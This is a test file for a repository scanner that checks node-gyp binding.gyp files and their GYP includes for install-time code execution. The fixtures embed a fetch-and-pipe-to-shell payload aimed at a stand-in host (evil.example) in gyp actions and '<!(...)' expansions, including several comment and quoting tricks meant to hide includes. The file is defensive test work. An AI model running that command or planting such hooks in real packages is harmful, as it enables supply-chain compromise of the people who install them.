import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function encode(text: string): Uint8Array {
  return new TextEncoder().encode(text);
}

function inspected(files: { path: string; text: string }[]) {
  return inspectRepository({
    files: files.map((file) => ({ path: file.path, bytes: encode(file.text) })),
  });
}

test("node-gyp definitions are install scripts, including a benign npm install hook", () => {
  // PRD section 8: the scan checks install and build scripts. node-gyp loads
  // binding.gyp during `node-gyp rebuild` and runs its actions. An npm
  // install script that only says `node-gyp rebuild` does not contain the
  // command those actions run.
  for (const path of [
    "binding.gyp",
    "Native/Binding.GYP",
    "deps/common.gypi",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  const scan = (gyp: string) =>
    inspected([
      {
        path: "package.json",
        text: JSON.stringify({
          name: "native-addon",
          scripts: { install: "node-gyp rebuild" },
        }),
      },
      { path: "binding.gyp", text: gyp },
    ]);
  const before = scan(`{
    "targets": [{ "target_name": "addon", "sources": ["src/addon.cc"] }]
  }`);
  const after = scan(`{
    "targets": [{
      "target_name": "addon",
      "sources": ["src/addon.cc"],
      "actions": [{
        "action_name": "fetch",
        "inputs": [],
        "outputs": ["fetched.txt"],
        "action": ["sh", "-c", "${PAYLOAD}"]
      }]
    }]
  }`);
  expect(before.findings).toEqual([]);
  expect(before.downloads).toEqual([]);
  expect(before.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "binding.gyp",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.downloads).toContain("https://evil.example/install.sh");
  expect(after.visibilityGaps).toContain(
    "Install-time download not retrieved: https://evil.example/install.sh",
  );
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("a GYP includes entry is scanned under the included file's real name", () => {
  // Includes are relative to the file that names them, and a nested include
  // may use any suffix. `<!(...)` runs in a shell when gyp loads the file.
  const scan = (command: string) =>
    inspected([
      {
        path: "binding.gyp",
        text: `{\n  'includes': [\n    'deps/a.inc',\n  ],\n}\n`,
      },
      {
        path: "deps/a.inc",
        text: `{\n  'includes': [\n    'b.inc',\n  ],\n}\n`,
      },
      {
        path: "deps/b.inc",
        text: `{\n  'variables': {\n    'fetched': '<!(${command})',\n  },\n}\n`,
      },
      {
        path: "pkg/native/binding.gyp",
        text: `{\n  'includes': [\n    '../../deps/fetch.txt',\n  ],\n}\n`,
      },
      {
        path: "deps/fetch.txt",
        text: `{\n  'variables': { 'x': '<!(${command})' },\n}\n`,
      },
    ]);
  const before = scan("echo safe");
  const after = scan(PAYLOAD);
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 5,
  });
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "deps/b.inc",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "deps/fetch.txt",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.downloads).toContain("https://evil.example/install.sh");
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("GYP includes do not adopt files outside the repository or ordinary prose", () => {
  const inspection = inspected([
    {
      path: "binding.gyp",
      text: `{
        'includes': [
          '../payload.txt',
          '/tmp/payload.txt',
          'https://evil.example/payload.txt',
        ],
        'targets': [{
          'target_name': 'addon',
          'sources': ['src/addon.cc'],
          'note': "see includes: [ 'notes.txt' ]"
        }]
      }`,
    },
    { path: "payload.txt", text: `${PAYLOAD}\n` },
    { path: "notes.txt", text: `${PAYLOAD}\n` },
  ]);
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "partial",
    items: 1,
  });
  expect(inspection.visibilityGaps).toEqual([
    "GYP include not acquired: ../payload.txt",
    "GYP include not acquired: /tmp/payload.txt",
    "GYP include not acquired: https://evil.example/payload.txt",
  ]);
  expect(surfacesOf("binding.gyp.bak")).toEqual([]);
  expect(surfacesOf("notes.gyp.txt")).toEqual([]);
  expect(surfacesOf("dir.gyp/addon.c")).toEqual(["source"]);
  expect(surfacesOf("LICENSE")).toEqual([]);
});

/** A file gyp would execute only if an includes entry names it. */
function includedPayload(path: string) {
  return {
    path,
    text: `{\n  'variables': { 'x': '<!(${PAYLOAD})' },\n}\n`,
  };
}

function scanGyp(gyp: string, paths: string[]) {
  return inspected([
    { path: "binding.gyp", text: gyp },
    ...paths.map(includedPayload),
  ]);
}

function expectIncluded(gyp: string, path: string) {
  expect(scanGyp(gyp, [path]).findings).toContainEqual(
    expect.objectContaining({
      path,
      category: "unsafe-execution",
      severity: "high",
    }),
  );
}

test("a comment containing ] cannot hide a GYP includes entry", () => {
  // gyp evaluates the file as Python, so the bracket inside the comment is
  // not the end of the list.
  expectIncluded(
    `{
'includes': [ # ] sneak
'evil.txt',
],
}
`,
    "evil.txt",
  );
});

test("a comment between a GYP includes key and its colon cannot hide the list", () => {
  expectIncluded(
    `{
'includes' # comment about includes
: [
'evil.txt',
],
}
`,
    "evil.txt",
  );
});

test("a hash inside a quoted GYP include path is part of the path", () => {
  // A `#` in a string is content. Truncating at the hash would scan `path`
  // and miss the file gyp loads.
  const path = "path#with#hash.txt";
  const inspection = scanGyp(
    `{\n  'includes': ['${path}', "dir/path#hash.txt"],\n}\n`,
    [path, "dir/path#hash.txt", "path", "dir/path"],
  );
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path,
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path: "dir/path#hash.txt",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(inspection.findings.map((finding) => finding.path)).not.toContain(
    "path",
  );
  expect(inspection.findings.map((finding) => finding.path)).not.toContain(
    "dir/path",
  );
});

test("comments around a GYP includes list cannot hide its entries", () => {
  // Same list shape gyp accepts: comments between the colon and the bracket,
  // between the bracket and the first item, and between items. Both quote
  // styles. A `]` inside those comments is not the end of the list.
  expectIncluded(
    `{
"includes": # before the list
[ # ] still open
"kept.txt", # ] not the end
'evil.txt',
],
}
`,
    "evil.txt",
  );
  expectIncluded(
    `{
'includes':
# between the colon and the bracket
[
# before the item
"evil.txt"
]
}
`,
    "evil.txt",
  );
  // A backslash-newline outside a string is Python whitespace.
  expectIncluded(
    `{
'includes'\\
: [
'evil.txt',
],
}
`,
    "evil.txt",
  );
});

test("a GYP include named only inside a Python comment is not scanned", () => {
  const inspection = scanGyp(
    `{\n  'includes': [\n    'evil.txt', # 'decoy.txt'\n  ],\n}\n`,
    ["evil.txt", "decoy.txt"],
  );
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path: "evil.txt",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(inspection.findings.map((finding) => finding.path)).not.toContain(
    "decoy.txt",
  );
});

test("adjacent GYP include strings divided by a comment are one path", () => {
  // Inside the list, Python concatenates adjacent literals. The comment is
  // not a separator, and the `]` in it is not the end of the list.
  expectIncluded(
    `{
'includes': [
'ev' # ]
'il.txt',
],
}
`,
    "evil.txt",
  );
});

test("a ] inside a quoted GYP include path does not hide the next entry", () => {
  const inspection = scanGyp(
    `{
'includes': [
'file].txt',
'evil.txt',
],
}
`,
    ["file].txt", "evil.txt"],
  );
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path: "file].txt",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path: "evil.txt",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  // A `# ]` inside a triple-quoted entry is still string content.
  expectIncluded(
    `{
'includes': [
'''# ]
''',
'evil.txt',
],
}
`,
    "evil.txt",
  );
});

test("an escaped quote does not turn the rest of a GYP include into a comment", () => {
  // Python keeps the hash inside the string. A comment-blind read, or one
  // that ends the string at the escaped quote, scans a different path.
  const path = "foo'#bar.txt";
  const inspection = scanGyp(
    `{\n  'includes': ['foo\\'#bar.txt', 'evil.txt'],\n}\n`,
    [path, "evil.txt", "#bar.txt"],
  );
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path,
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path: "evil.txt",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(inspection.findings.map((finding) => finding.path)).not.toContain(
    "#bar.txt",
  );
});

test("a backslash newline inside a GYP include keeps a following hash in the path", () => {
  expectIncluded(
    `{
'includes': [
'ev\\
#il.txt',
],
}
`,
    "ev#il.txt",
  );
});

test("a missing GYP include is a visibility gap", () => {
  // gyp hard-fails when the named file is absent. The scan either missed an
  // acquired file or the file is generated at install, so its commands were
  // not reviewed. Coverage cannot stay complete.
  const inspection = inspected([
    {
      path: "binding.gyp",
      text: "{'includes': ['deps/generated.gypi']}\n",
    },
  ]);
  expect(inspection.visibilityGaps).toEqual([
    "GYP include not acquired: deps/generated.gypi",
  ]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "partial",
    items: 1,
  });
  expect(inspection.findings).toEqual([]);
  expect(new TextDecoder().decode(inspection.inventory)).toContain(
    "GYP include not acquired: deps/generated.gypi",
  );
});

test("a GYP include that leaves the repository is a visibility gap", () => {
  // `../a.inc` from a root binding.gyp is not an acquired file. The in-repo
  // `a.inc` is a different path and must not be scanned in its place.
  const inspection = inspected([
    {
      path: "binding.gyp",
      text: "{'includes': ['../a.inc']}\n",
    },
    includedPayload("a.inc"),
  ]);
  expect(inspection.visibilityGaps).toEqual([
    "GYP include not acquired: ../a.inc",
  ]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "partial",
    items: 1,
  });
  expect(inspection.findings).toEqual([]);
});

test("a nested GYP include the scan cannot acquire is a visibility gap", () => {
  const inspection = inspected([
    {
      path: "binding.gyp",
      text: "{'includes': ['deps/a.gypi']}\n",
    },
    {
      path: "deps/a.gypi",
      text: "{'includes': ['missing.inc']}\n",
    },
  ]);
  expect(inspection.visibilityGaps).toEqual([
    "GYP include not acquired: missing.inc",
  ]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "partial",
    items: 2,
  });
  expect(inspection.findings).toEqual([]);
});
